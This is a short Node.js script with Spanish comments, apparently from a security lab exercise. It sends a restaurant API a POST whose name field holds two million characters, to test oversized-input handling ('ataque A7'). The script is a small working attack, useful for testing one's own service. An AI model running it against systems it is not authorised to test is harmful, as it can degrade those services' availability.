// ataque-grande.js: envía un nombre de 2 millones de caracteres (ataque A7)
// Uso: node ataque-grande.js http://IP:4000/restaurantes
const URL = process.argv[2] || "http://localhost:4000/restaurantes";

fetch(URL, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ nombre: "a".repeat(2_000_000), ciudad: "Cali" })
})
  .then((r) => console.log("Estado:", r.status))
  .catch((e) => console.log("No se pudo conectar:", e.message));
